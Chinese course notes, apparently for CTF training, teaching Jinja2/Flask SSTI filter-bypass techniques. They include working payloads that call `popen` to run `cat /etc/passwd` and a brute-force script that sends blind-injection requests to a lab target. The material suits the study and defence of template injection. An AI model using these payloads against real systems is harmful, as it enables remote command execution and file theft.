---
title: SSTI 过滤绕过
category: SSTI/过滤绕过
tags: [SSTI, WAF绕过, __getitem__, attr, request, length, dict, join, 符号构造, reverse, replace, chr, print, "{% %}"]
source: 课程笔记 20251014
order: 5
---

## 一句话概括

SSTI 的过滤通常只拦几个**字面量**（`[`、`.`、`'`、数字、`os`…），但 Python 里同一件事往往有**多条等价写法**。核心思路：**把被拦的字面量换成"运行期算出来"的值（过滤器、请求参数、`attr`）**。

## 原理：常见过滤与对应思路

| 被过滤 | 症状 | 绕过思路 |
|---|---|---|
| `[` `]` | 枚举子类正常，一索引就报错 | 换 `__getitem__` / `pop` / 键名走 `request` 参数 |
| `'` `"` | 字符串字面量写不了 | 键名走 `request.args.x`；或用 `dict(...)\|join` 现造字符串 |
| 数字 | 索引/参数里的数字被拦 | 用 `'aaaa'\|length` 的算术凑数 |
| `.` | 属性链断掉 | 用 `\|attr('__class__')` |
| `_` | `__class__` 这类名字写不了 | 从不含过滤的字符串里"抠"出 `_` |
| 关键字（`os`/`config`…） | 命中即拦 | 用 `__builtins__` 导入、`current_app`、或参数传递 |
| 空格 | payload 被截断 | `%20`、换行、`/**/` 视上下文 |
| `{{ }}` | 模板能执行，但算出来不回显 | 改用 `{% %}` 语句块判断，或 `{% print(...) %}` 输出 |

## 一、中括号 `[]` 被过滤

**判断方法（原笔记）**：**寻找可用函数时一切正常，调用时出问题** —— 即 `{{''.__class__.__base__.__subclasses__()}}` 能正常列出子类列表，但一加索引 `[i]` 就 error，说明 `[` `]` 被拦了。

### 绕过：`__getitem__` 魔术方法

`__getitem__` 就是 `[]` 背后的实现：

- 对**字典**使用时，传入字符串 → 返回对应键的值
- 对**列表**使用时，传入整数 → 返回对应索引的值

```python
# 原写法（被拦）
{{''.__class__.__base__.__subclasses__()[i]}}

# 绕过：用 __getitem__ 等价于 [i]
{{''.__class__.__base__.__subclasses__().__getitem__(i)}}
```

### 其他等价写法

| 原始 | 绕过 |
|---|---|
| `list[i]` | `list.__getitem__(i)` 或 `list.pop(i)` |
| `dict['key']` | `dict.__getitem__('key')` 或 `dict.get('key')` |
| `dict[变量]` | 把键名通过 `request.args.x` 传进来 |

## 二、单双引号 `'` `"` 被过滤

字符串写不了，就把**字符串挪到请求里**去 —— Flask 的 `request` 对象在模板里始终可用。

### request 常用取值点

| 写法 | 取什么 |
|---|---|
| `request.args.key` | GET 参数 |
| `request.values.x1` | 所有参数（GET + POST） |
| `request.form.key` | POST 参数（`application/x-www-form-urlencoded` 或 `multipart/form-data`） |
| `request.data` | POST 原始数据 |
| `request.json` | POST 的 JSON 参数 |
| `request.cookies` | Cookie |
| `request.headers` | 请求头 |

### 实例

```python
# 原型
{{''.__class__.__base__.__subclasses__()[i].__init__.__globals__['popen']}}
```

把字符串 `'popen'` 和命令都改成从参数取：

```python
{{''.__class__.__base__.__subclasses__()[i].__init__.__globals__[request.args.popen](request.args.cmd).read()}}
```

- **GET**：URL 追加 `/?popen=popen&cmd=cat /etc/passwd`
- **POST**：URL 不动，只改 body —— `popen=popen&cmd=ls`
- **Cookie**：把 `popen` / `cmd` 放进 `Cookie` 头，供 `request.cookies` 读取

> 此处原为 Cookie 提交的截图，要点：payload 中的字符串全部换成 `request.cookies.xxx`，实际值通过 `Cookie:` 请求头传入。

## 三、数字被过滤

索引、参数里的数字被拦时，用**字符串长度**当计算器。

### 用 `|length` 做算术

```jinja2
{% set a = 'aaaaaaaaaa' | length %}
{{ a }}          {# 10 #}
```

组合运算（乘、减）：

```jinja2
{% set a = 'aaaaaaaaaa' | length * 'aaa' | length %}
{{ a }}
```

```jinja2
{% set a = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' | length * 'aaaaa' | length - 'aaaaaaaaaaaaa' | length %}
{{ a }}
```

原理：`'aaaaaaaaaa'|length` 得到数字 `10`，多个数字相乘相减就能**造出任意整数**（原笔记注释为「乘减法」）。想造 `157`，就用「长字符串长度 × 短字符串长度 − 另一串长度」这种形式拼出来。

### 另一种语法：用 `dict | join | count` 造数

```jinja2
{% set nine=dict(aaaaaaaaa=a)|join|count %}
{% set eighteen=nine+nine %}
{{nine,eighteen}}
```

拆解：

| 片段 | 作用 |
|---|---|
| `dict(aaaaaaaaa=a)` | 建字典，键是字符串 `"aaaaaaaaa"`，值是变量 `a`（此处未定义，为 null / 空） |
| `\|join` | 把字典的键拼接成字符串 → `"aaaaaaaaa"` |
| `\|count` | 数字符个数 → `9` |
| `none + nine` | 得到 `18` |

**要点**：`join` 拼的是**键名**，所以"键有多长，数字就是几"。这比手写一长串 `a` 更省字符。

## 四、符号构造（`_`、`<`、`>`、空格、`%`）

当连下划线 / 尖括号都被过滤，就从**没被过滤的现成字符串**里"抠"字符。

### 取出 `<` 和 `>`

```jinja2
{% set ben = (()|select()|string()) %}
{{ ben }}
```

`()|select()` 得到一个生成器对象，`|string` 转成字符串后形如 `<generator object ...>` —— 里面就带 `<` 和 `>`。

### 取出下划线 `_`

```jinja2
{% set ben = (self|string()) %}
{{ ben }}
```

`self` 是 Jinja2 的 TemplateReference，它的字符串表示里含 `_`。

### 取出空格

```jinja2
{% set ben = (self|string|urlencode) %}
{{ ben }}
```

经 `urlencode` 后，空格会变成 `%20` 形式，用于在 payload 里构造空格。

### 取出百分号 `%`

```jinja2
{% set ben = (app.__doc__|string) %}
{{ ben }}
```

`app` 对象的 `__doc__` 文档字符串里含有 `%`。

### 用 lipsum 取字符

```jinja2
{{lipsum|string|list}}

{% set a = (lipsum|string|list)[18] %}{{a}}   {# 取到 "_" #}
```

`lipsum|string` 得到它的字符串表示，`|list` 拆成字符列表，再用索引取出想要的字符（第 18 个是下划线）。

## 五、用过滤器与 `chr()` 构造字符串

「四」是从**现成字符串**里抠单个字符；这一节是让**过滤器 / `chr()` 现场把被拦的字符串拼出来**。当 `_`、引号、关键字都被拦时，这几条比手抠字符更省事。

### 用 `|reverse` 反转出字符串

把一个"内容一样、顺序颠倒"的字符串反转回来，就能得到被拦的关键字 —— 因为过滤规则通常只匹配**正着写**的 `__class__`：

```jinja2
{% set a = "__ssalc__" | reverse %}   {# "__class__" #}
{{ a }}
```

### 用 `|replace` 替换出字符串

把关键位置先写成**不被拦的占位符**，再 `replace` 换回来：

```jinja2
{% set a = "__claee__" | replace("ee", "ss") %}   {# "__class__" #}
{{ a }}
```

### 用 `|join` 拼出字符串

`|join` 会把列表元素首尾相接，于是可以把一个关键字**拆成几段**分别写进列表：

```jinja2
{% set a = ["__c", "las", "s__"] | join %}   {# "__class__" #}
{{ a }}
```

> 注意区分：`["a","b"]|join` 拼的是**列表元素**，`dict(...)|join` 拼的是**字典键名**（见「三」）。两者都是"用拼接躲关键字"的写法。

### 串成完整链：`|reverse` 版

```jinja2
{% set a = "__ssalc__" | reverse %}
{% set b = "__esab__" | reverse %}
{% set c = "__sessalcbus__" | reverse %}
{% set d = "__tini__" | reverse %}
{% set e = "__slabolg__" | reverse %}
{% set f = "nepop" | reverse %}
{{ ""[a][b][c]()[199][d][e]['os'][f]('cat /etc/passwd')['read']() }}
```

链上每一段都用反转后的字面量，取回来就是 `__class__` / `__base__` / `__subclasses__` / `__init__` / `__globals__` / `popen`。

**为什么 `""[a]` 能当 `"".__class__` 用？** 这是理解上面整条链的关键：

- 在**纯 Python** 里 `""['__class__']` 会直接报 `TypeError: string indices must be integers` —— 字符串只认整数下标
- 但 Jinja2 把 `x[y]` 编译成 `environment.getitem(x, y)`，该方法在 `x[y]` 抛 `TypeError` 且 `y` 是字符串时，会**回退成 `getattr(x, y)`**。于是 `""['__class__']` 实际取到 `str.__class__`，与 `"".__class__` 等价

> 这也解释了「四」里用 `|attr` 平替 `.` 为什么成立：在 Jinja2 里 `obj['name']` 与 `obj.name` 常常是一回事。用 `[]` 顶替 `.` 的写法（`""['__class__']['__base__']...`）见「一」与「六」；反过来 `.` / `[]` 都被拦时才有 `|attr` 版。

### 用 `chr()` 编码构造字符串

`chr()` 是 Python 内置函数，把码点还原成字符；模板里默认没有它，要先从 `__builtins__` **取出来**：

```jinja2
{% set chr = url_for.__globals__['__builtins__'].chr %}
{% set class_str = chr(95) + chr(95) + chr(99) + chr(108) + chr(97) + chr(115) + chr(115) + chr(95) + chr(95) %}
{{ ""[class_str] }}
```

`95` 是 `_`、`99` 是 `c`、`108` 是 `l`、`97` 是 `a`、`115` 是 `s`，拼出来正是 `__class__`。好处是**整条字符串里一个敏感字符都不出现**，纯靠数字拼。

> 第一行能不能取到 `chr`，取决于 `url_for.__globals__['__builtins__']` 的具体类型：多数环境下它是**模块对象**，直接 `.chr` 即可；若该环境里放的是**字典**，则要写成 `['__builtins__']['chr']`。取不到就换别的对象（如 `self.__init__.__globals__`）再试。

### `+` 拼接 与 `~` 波浪号拼接

Jinja2 沿用 Python 语义，字符串可以直接用 `+` 相加：

```jinja2
{% set a = "__cla" %}
{% set b = "ss__" %}
{{ a + b }}          {# "__class__" #}
```

若 `+` 也被过滤，改用 Jinja2 自带的拼接运算符 `~`（它会**先把两侧转成字符串**再连接，对数字同样适用）：

```jinja2
{% set a = "__cla" %}
{% set b = "ss__" %}
{{ a ~ b }}          {# "__class__" #}
```

同理可以把整条链的每一段都拆开再拼：

```jinja2
{% set a='__cla' %}
{% set b='ss__' %}
{% set c='__ba' %}
{% set d='se__' %}
{% set e='__subcl' %}
{% set f='asses__' %}
{% set g='__in' %}
{% set h='it__' %}
{% set l='__gl' %}
{% set i='obals__' %}
{% set j='po' %}
{% set k='pen' %}
{{ ""[a~b][c~d][e~f]()[199][g~h][l~i]['os'][j~k]('cat /etc/passwd')['read']() }}
```

**要点**：`+` 与 `~` 都只是"把碎片拼成关键字"，本身**不改变过滤强度** —— 如果分片里仍含被拦字符（如 `_`），得配合「四」的符号构造或本节的 `chr()` 才拼得出来。

## 六、复合绕过实战：常见字符全被过滤

### 本题情景与解题手法

**题目形态**：过滤了 `"`、`'`、`+`、`request`、`.`、`[`、`]` 等一大批字符，正常的 SSTI payload 几乎寸步难行。

**第一步：确认哪些字符/关键字被拦**

逐个字符试，或者直接把原型 payload 发出去看哪里报错：

```text
原型（会被拦）：
{().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat flag').read()}
```

命中信息：`.` 用不了（属性链断），`[]` 用不了（索引），`'` / `"` 用不了（字符串），`request` 用不了（不能借参数传字符串）。

**第二步：确定替代方案**

| 被拦 | 替代 |
|---|---|
| `.` | `\|attr('...')` |
| `[]` | `\|attr('__getitem__')(i)` |
| `'...'` | `dict(键=1)\|join` 现造字符串 |
| `+` | 不拼字符串，直接由 `dict\|join` 产出 |

**第三步：用 `dict(...)|join` 现造每一个需要的字符串**

```jinja2
{% set a = dict(__class__=1) | join %}       {# "__class__" #}
{% set b = dict(__base__=1) | join %}        {# "__base__" #}
{% set c = dict(__subclasses__=1) | join %}  {# "__subclasses__" #}
{% set d = dict(__getitem__=1) | join %}     {# "__getitem__" #}
{% set e = dict(__in=1, it__=2) | join %}    {# 拼接为 "__init__" #}
{% set f = dict(__glo=1, bals__=2) | join %} {# 拼接为 "__globals__" #}
{% set g = dict(popen=1) | join %}           {# "popen" #}
```

要点：

- `dict(键=1)` 把想要的字符串当作**键名**写进去
- `|join` 把键名拼出来 —— 这样就不需要写引号
- 当**单个字符串里也有被过滤的片段**时（如 `__init__` 含被拆分的部分），可以**拆成多个键再拼**：`dict(__in=1, it__=2)|join` → `"__init__"`

**第四步：用 `|attr` 串起整条链**

```jinja2
{(()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g))}
```

逐段对照：

| 片段 | 等价于 |
|---|---|
| `()\|attr(a)` | `().__class__` |
| `\|attr(b)` | `.__base__` |
| `\|attr(c)()` | `.__subclasses__()` |
| `\|attr(d)(117)` | `[117]`（`__getitem__(117)`） |
| `\|attr(e)` | `.__init__` |
| `\|attr(f)` | `.__globals__` |
| `\|attr(d)(g)` | `['popen']` |

**注入手法一句话总结**

> **凡是被拦的字面量，都改成运行期产物** —— 字符串用 `dict(...)|join` 造、属性访问用 `|attr()`、键访问用 `|attr('__getitem__')(...)`，于是整条继承链在没有 `.` `[]` `'` 的情况下照样能跑通。

## 七、`{{ }}` 被拦时改用 `{% %}` 与 `print` 回显

前面几节解决的都是"**表达式里的字符**被拦"；这一节解决的是**输出定界符 `{{ }}` 本身被拦** —— 模板照常执行，但算出来的东西回显不出来。

### 第 0 步：先确认 `{{ }}` 是否真被拦

把最简单的表达式发出去看有没有回显：

```jinja2
{{ 7*7 }}
```

- 返回 `49` → `{{ }}` 正常，回去看前面几节
- 返回原文 / 被拦 / 变成空白 → `{{ }}` 被过滤，继续往下

### 用 `{% %}` 判断语句能否执行

`{% %}` 是**语句块**（控制流），本身不输出内容；但它里面的**字面文本**照常输出。所以只要块外的 `QIU` 能回来，就说明模板引擎照常执行、只是 `{{ }}` 被堵：

```jinja2
{% if 2>1 %}QIU{%endif%}
```

- 页面出现 `QIU` → `{% %}` 与表达式求值都可用
- 没有 `QIU` → 连语句块也被拦，换别的手段

### 用 `{% if %}` 做布尔判断（盲注式探测）

`if` 后面**只要有内容就为真**（非空即真），可以拿它当"有无回显"的探针，逐段验证属性链：

```jinja2
{% if ''.__class__ %}QIU{%endif%}
```

回显 `QIU` → `''.__class__` 有内容（确实拿到了 `str` 类），说明这条链是通的。

> 把 `''.__class__` 换成链上的任意一段（如 `().__class__.__base__.__subclasses__()`），就能**一段一段确认**每一步是否成立 —— 这就是没有 `{{ }}` 时的"盲注"用法。

### 用脚本爆破类索引

子类列表里 `os._wrap_close` 的下标随环境变化（本文别处用 117，这里用 199），没有 `{{ }}` 回显时可以**逐个索引盲试**，命中就停：

```python
import requests

url = "http://靶机地址/flasklab/level/2"

for i in range(300):
    try:
        data = {
            "code": '{% if "".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("cat /etc/passwd").read() %}Benben{% endif %}'
        }
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if "Benben" in response.text:
                print(i, "-->", data)
                break
    except:
        pass
```

脚本逻辑：

| 步骤 | 说明 |
|---|---|
| 遍历 `0..299` | 依次猜 `__subclasses__()` 的下标 |
| `{% if ... %}Benben{% endif %}` | 用 `{% if %}` 代替 `{{ }}`；命令执行结果非空 → 条件为真 → 回显 `Benben` |
| 命中即 `break` | 第一个让 `Benben` 出现的就是可用的 `os._wrap_close` 下标 |

> 原脚本里写的是真实靶机地址，这里按规范抽象成 `靶机地址`，实际运行时替换成目标 `IP:端口`。

### 用 `{% print(...) %}` 直接回显

`{{ }}` 被拦时，等价于"把结果打出来"的还有 `{% print(...) %}`：

```jinja2
{% print("".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read()) %}
```

`print` 是 Jinja2 的**输出语句**，会把括号里表达式的值写进渲染结果 —— 效果和 `{{ ... }}` 一样，但它走的是 `{% %}` 通道，能躲开针对 `{{ }}` 的拦截。

## 八、SSTI 过滤绕过对照表

| 被过滤的字符 / 函数 | 绕过写法 | 说明 |
|---|---|---|
| `[` `]` | `.__getitem__(x)` | `[]` 的底层实现 |
| `[` `]` | `.pop(x)` / `.get(x)` | 列表 / 字典的等价方法 |
| `[` `]` | `request.args.x` / `request.values.x` | 键名从请求参数取 |
| `'` `"` | `request.args.x`、`request.form.x` | 字符串走请求 |
| `'` `"` | `dict(键=1)\|join` | 用键名现造字符串 |
| `.` | `\|attr('__class__')` | 属性访问过滤器 |
| `_` | `lipsum\|string\|list` 取索引字符 | 从现成字符串抠 `_` |
| `_` | `(self\|string)` | 同上 |
| `+` | `~` 或 `dict()\|join` | Jinja2 里字符串拼接用 `~` |
| 数字 | `'aaaa'\|length` 算术 | 长度当计算器 |
| 数字 | `dict(a=1)\|join\|count` | 键长即数字 |
| 空格 | `%20` / 换行 / `/**/` | 视上下文而定 |
| `os` | `__builtins__['__import__']('os')` | 不写 `os` 字面量 |
| `os` | `request.args.x` 传 `os` | 字符串走请求 |
| `config` | `url_for.__globals__['current_app'].config` | 换路径取对象 |
| `class` / `subclasses` 等关键字 | `dict(...)\|join` + `\|attr` | 字符串拆分后拼回 |
| `'` `"` | `"__ssalc__"\|reverse` | 反着写再反转，还原被拦关键字 |
| `'` `"` | `"__claee__"\|replace("ee","ss")` | 占位符换回关键字 |
| `'` `"` | `["__c","las","s__"]\|join` | 列表元素拼接现造字符串 |
| 关键字 / `_` | `chr(95)+chr(99)+...` | 码点拼字符串，先取 `__builtins__.chr` |
| `+` 被拦 | `~` 或 `\|join` | `~` 会先把两侧转成字符串 |
| `.` | `''['__class__']`（`[]` 闭合） | Jinja2 的 `getitem` 失败会回退 `getattr`，下标即属性 |
| `{{ }}` | `{% print(表达式) %}` | 输出型语句，走 `{% %}` 通道回显 |
| `{{ }}` | `{% if 表达式 %}X{% endif %}` | 非空即真，做布尔盲注探测 |

## 利用条件

1. 至少确认存在 SSTI（`{{ }}` 可用）
2. **过滤规则是"关键词 / 字符级"的**：这类过滤几乎总有等价写法可以绕；如果是严格的沙箱（如禁用了属性访问、白名单机制），则绕不过去
3. 有回显，或能从报错/外带确认结果

## 踩坑与备注

- **先定位"到底拦了什么"**：不要一上来就堆 payload。先发最简的 `{{7*7}}`，再逐步加 `.__class__`、`__subclasses__()`、`[0]`、`['x']`，**哪一步开始出错，就锁定被拦的字符**。
- **`|join` 拼的是键名，不是键值**：原笔记早期把 `dict(__cla=1, ss=2)|join` 注释成「把参数值拼接成字符串」是不准确的；后半句「利用 join 读键名的原则」才是正解，实例 payload 也印证了这一点。
- **`dict` 的键可以用任意合法标识符**：所以 `dict(__in=1, it__=2)` 能拼出 `__init__`，这是"拆词绕过"的关键手法。
- **`|attr` 只解决属性访问**：它不能替代 `[]`，索引要靠 `|attr('__getitem__')(i)`；两者要配合使用。
- **`__getitem__` / `pop` 都能取元素**：`pop` 会**移除**元素，若后续还要用同一列表（如先取子类再索引），优先 `__getitem__`。
- **符号构造依赖具体环境**：`lipsum|string` 的哪个下标是 `_`、`self|string` 的具体形态，可能随 Jinja2 版本变化，取之前先用 `{{lipsum|string|list}}` 打出来看一眼，别硬编码索引。
- **`request` 本身也可能被拦**：那就把字符串拆开拼（`dict(re=1, quest=2)|join` → `"request"`），或用 `|attr` 从别的对象拿上下文。
- **`""['__class__']` 只在 Jinja2 里成立，别当成普通 Python 下标**：纯 Python 会报 `TypeError: string indices must be integers`。它能跑通是因为 Jinja2 用 `environment.getitem` 包装了 `x[y]`，字符串键取值失败时**回退到 `getattr`**（本文已用 Jinja2 3.1.6 实测：`""['__class__']` 返回 `str` 类）。所以源笔记那串 `""[a][b][c]()` 不是写错了，是吃到了这个回退特性。
- **`+` 与 `~` 都是合法拼接，别混淆"被过滤"和"不合法"**：Jinja2 沿用 Python 语义，`{{ "__cla" + "ss__" }}` 本来就能得到 `__class__`（实测确认）。源笔记把「`+` 号拼接」和「`~` 波浪号拼接」并列列举，应理解为**两种都可用的写法** —— `+` 只在"被 WAF 拦掉"时才需要换成 `~`，而不是 `+` 本身不可用。
- **`{% print(...) %}` 依赖 Jinja2 版本**：它是 Jinja2 的输出语句，实测在 Jinja2 3.1.6 上 `{% print(7*7) %}` 正常输出 `49`；若目标环境是被裁剪/魔改过的模板引擎、不认这个标签，退回 `{% if ... %}X{% endif %}` 做布尔盲注。
- **`if` 的"非空即真"有个副作用**：表达式求值报错或取到 Undefined 时，Jinja2 的 Undefined 是**假值**，`if` 会静默走假分支。所以看到"没有回显"时，要分清是**条件为假**还是**这段链本身就报错了** —— 可以逐段用 `{% if %}` 验证。
- **还原类过滤器（`reverse`/`replace`）的前提**：过滤只匹配**正着写**的关键字。若 WAF 会多轮解码 / 正则递归匹配，反转或替换后的字面量也可能被拦，此时改用 `chr()` 或从请求参数取值。
- **源笔记的「`[]` 闭合」与「`|attr` 平替」两段**，内容与本文「一、中括号被过滤」「六、复合绕过实战」重叠，已并入「八、对照表」作交叉引用，不再重复展开。
